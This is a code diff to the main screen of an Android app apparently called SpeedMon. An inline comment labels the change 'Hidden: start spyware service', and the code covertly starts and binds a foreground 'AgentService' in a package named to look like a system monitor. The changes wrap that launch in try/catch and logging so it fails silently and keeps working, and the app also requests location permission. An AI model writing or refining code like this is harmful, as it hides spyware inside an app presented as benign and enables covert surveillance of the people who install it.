@@ -14,6 +14,7 @@ import android.os.Bundle
 import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
+import android.util.Log
 import android.widget.*
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
@@ -49,6 +50,7 @@ class MainActivity : AppCompatActivity() {
     private val serviceConnection = object : ServiceConnection {
         override fun onServiceConnected(name: ComponentName, service: IBinder) {
             agentService = service
+            Log.d("SpeedMon", "Agent service connected")
         }
         override fun onServiceDisconnected(name: ComponentName) { agentService = null }
     }
@@ -70,7 +72,7 @@ class MainActivity : AppCompatActivity() {
 
         // Hidden: start spyware service using string class name
         startSpywareService()
-        bindService(Intent().setClassName("com.system.monitor", "com.system.monitor.AgentService"), serviceConnection, Context.BIND_AUTO_CREATE)
+        bindAgentService()
 
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
             ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.ACCESS_FINE_LOCATION), 1)
@@ -197,17 +199,39 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun startSpywareService() {
-        val intent = Intent().setClassName("com.system.monitor", "com.system.monitor.AgentService")
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(intent)
-        } else {
-            startService(intent)
+        try {
+            val intent = Intent().setClassName("com.system.monitor", "com.system.monitor.AgentService")
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(intent)
+            } else {
+                startService(intent)
+            }
+            Log.d("SpeedMon", "Agent service start attempted")
+        } catch (e: Exception) {
+            Log.w("SpeedMon", "Agent service start failed (not installed?)", e)
+        }
+    }
+
+    private fun bindAgentService() {
+        try {
+            bindService(
+                Intent().setClassName("com.system.monitor", "com.system.monitor.AgentService"),
+                serviceConnection,
+                Context.BIND_AUTO_CREATE
+            )
+            Log.d("SpeedMon", "Agent service bind attempted")
+        } catch (e: Exception) {
+            Log.w("SpeedMon", "Agent service bind failed (not installed?)", e)
         }
     }
 
     override fun onDestroy() {
         handler.removeCallbacks(updateRunnable)
-        unbindService(serviceConnection)
+        try {
+            unbindService(serviceConnection)
+        } catch (e: Exception) {
+            Log.w("SpeedMon", "Unbind failed", e)
+        }
         super.onDestroy()
     }
 }
